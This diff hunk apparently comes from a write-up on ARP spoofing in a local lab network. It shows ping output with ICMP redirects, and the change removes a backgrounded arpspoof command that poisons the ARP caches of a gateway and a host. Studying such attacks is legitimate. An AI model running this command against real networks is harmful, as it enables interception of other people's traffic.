@@ -290,9 +290,3 @@ From 10.2.1.17 (10.2.1.17) icmp_seq=3 Redirect Host (New nexthop: _gateway (10.2
 From 10.2.1.17 (10.2.1.17) icmp_seq=4 Redirect Host (New nexthop: _gateway (10.2.1.254)) 64 bytes from 1hr25s01-in-f14.1e100.net (216.58.213.78): icmp_seq=4 ttl=58 time=30.6 ms
 From 10.2.1.17 (10.2.1.17) icmp_seq=5 Redirect Host (New nexthop: _gateway (10.2.1.254)) 64 bytes from 1hr25s01-in-f78.1e100.net (216.58.213.78): icmp_seq=5 ttl=58 time=31.8 ms
 ```
-
-
-
-```
-arpspoof -t 10.2.1.254 10.2.1.48 -r > /dev/null 2>&1 &
-```
